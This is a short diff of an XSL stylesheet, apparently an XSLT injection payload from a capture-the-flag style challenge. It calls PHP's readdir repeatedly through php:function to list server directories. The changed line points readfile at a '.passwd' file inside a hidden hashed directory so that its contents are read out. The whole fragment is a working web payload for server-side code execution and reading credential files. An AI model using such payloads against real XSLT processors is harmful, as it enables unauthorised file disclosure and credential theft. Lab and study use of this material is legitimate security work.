@@ -10,7 +10,7 @@
     <p>
     <xsl:value-of select="description"/>
     <span><xsl:value-of select="php:function('readdir')"/> % <xsl:value-of select="php:function('readdir')"/> % <xsl:value-of select="php:function('readdir')"/> % <xsl:value-of select="php:function('readdir')"/> %  <xsl:value-of select="php:function('readdir')"/> % <xsl:value-of select="php:function('readdir')"/> % <xsl:value-of select="php:function('readdir')"/> % <xsl:value-of select="php:function('readdir')"/> % <xsl:value-of select="php:function('readdir')"/> % <xsl:value-of select="php:function('readdir')"/> % <xsl:value-of select="php:function('readdir')"/> % </span>
-    <span style="font-style:italic"> (<xsl:value-of select="php:function('readfile', '.passwd')"/> % <xsl:value-of select="php:function('readdir')"/> % <xsl:value-of select="php:function('readdir')"/>  %)</span>
+    <span style="font-style:italic"> (<xsl:value-of select="php:function('readfile', '.6ff3200bee785801f420fba826ffcdee/.passwd')"/> % <xsl:value-of select="php:function('readdir')"/> % <xsl:value-of select="php:function('readdir')"/>  %)</span>
     </p>
   </div>
 </xsl:for-each>
